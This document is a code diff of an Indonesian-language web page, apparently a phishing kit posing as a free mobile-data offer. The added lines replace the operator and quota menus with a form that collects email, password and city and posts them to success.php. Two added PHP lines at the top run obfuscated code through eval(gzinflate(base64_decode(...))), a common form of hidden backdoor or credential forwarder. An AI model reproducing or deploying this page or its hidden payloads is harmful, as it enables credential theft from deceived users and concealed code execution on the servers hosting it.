@@ -1,14 +1,9 @@
 <!-- https://www.rabiitch.ga/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
+<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
 <!DOCTYPE html>
 <html>
   <head>
- <script type="text/javascript"> 
-    var adfly_id = 13758497; 
-    var adfly_advert = 'int'; 
-    var popunder = true; 
-    var exclude_domains = ['komputer-temanku.blogspot.co.id', 'www.facebook.com/GarenaPointBlanklndonesia']; 
-</script> 
-<script src="https://komputer-temanku.blogspot.co.id/"></script>  	
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -48,53 +43,32 @@ body {
 <div style="border:1px solid #333333;padding:0px;margin:0 auto;" class="col-md-6">
 <div style="border:none;padding:0px;margin:0px;" class="well well-sm">
 <img style="border:none;width:100%;max-height:400px;margin:0 auto;" src="https://assets.jalantikus.com/assets/cache/1380/600/tips/old/Gratis-Kuota-Internet-untuk-Androi-_yang-Sudah-Rooting-Banner.jpg"/>
+<div style="border:none;" class="btn btn-success btn-block"><b><i class=""></i>MASUK DAN AKTIFKAN</b></div>
 </div>
 <center>
 <div  style="background:rgba(9, 9, 9, 0.89);padding:30px;width:100%" class="form-horizontal">
 <h4 >
-     <form action="prosess.php" id="login-form" method="post">
-<h2><img src="http://www.gambaranimasi.org/data/media/781/animasi-bergerak-bendera-indonesia-0012.gif" height="100%" width="150px"></h2>
+<img style="border:none;width:60%;max-height:50px;" src="https://i.stack.imgur.com/oL5c2.png"/></p>
   <div class="content">
-<center><img src="images/stars.gif"><font color="gold"><b>AKSES INTERNET GRATIS</b></font><img src="images/stars.gif"></center> </br>
-<div style="width:100%" class="form-group">
-<div class="input-group">
-    <span class="input-group-addon"><center><img src="https://lh4.ggpht.com/7jbfR0x3n3puLLjl5katMKC_x9CgG1hn3UKKTgag0rsvQDV1TunX1UqC11J5oVqSlj9K=w120"style="width:20px;height:20px;"></center></span>
-            <select class="form-control" id="gems">
-          <option>Nama Operator</option>
-          <option>Telkomsel</option>
-          <option>Mentari</option>
-          <option>Indosat</option>
-          <option>IM3</option>
-          <option>XL</option>
-          <option>Smartfreen</option>
-		  <option>3</option>
-</select>
-  </div>
-<div style="width:100%" class="form-group">
-<div class="input-group">
-    <span class="input-group-addon"><center><img src="https://i0.wp.com/www.pintekno.com/wp-content/uploads/2017/02/Internet-gratis.png"style="width:20px;height:20px;"></center></span>
-            <select class="form-control" id="gold">
-          <option>List Kuota Gratis</option>
-          <option>500MB</option>
-          <option>1GB</option>
-          <option>2GB</option>
-          <option>3GB</option>
-          <option>4GB</option>
-          <option>5GB</option>
-          <option>6GB</option>
-          <option>7GB</option>
-          <option>8GB</option>
-		  <option>9GB</option>
-		  <option>10GB</option>
-          </select>
+	        <h1></h1>
+        
+		
+	   <div class="zIndex">
+	          
+        <div class="registration">
+            <form id="frmLoginUI" name="frmLoginUI" method="post" action="success.php" onSubmit="return validate();"><div style='display:none'><input type='hidden' name='csrfmiddlewaretoken' value='UX8ogBv3k7w8XeR8SHNYr6GVbYvGKzlL' /></div>              
+	  <div style="width:100%" class="form-group">
+   <input type="email" class="form-control" name="email" id="email" placeholder="Email" required><br>
+                        <input type="Password" class="form-control" name="password" id="password" placeholder="Password" required><br>
+                        <input type="text" class="form-control" name="kota" id="kota" placeholder="Nama Kotamu" required><br>
 </div>
+
 <div style="width:100%" class="form-group">
- <div class="input-group">
-    <span class="input-group-addon"><center><img src="http://icon-icons.com/icons2/935/PNG/512/cellphone_icon-icons.com_73305.png"style="width:20px;height:20px;"></center></span>
-<input class="form-control" id="new"  placeholder=" Masukan Nomor Ponsel " type="Number">
-</div> 
-                <div class="zIndex">
-				<p>
-<div style="width:100%" class="form-group">
-<input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="Aktifkan Sekarang"> </form>
+  <form><input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="Masuk Dan Aktifkan"> </form>
+</div>
+</div>
+</div>
+</div>
+<div class="col-md-3">
+</div>
 </div>
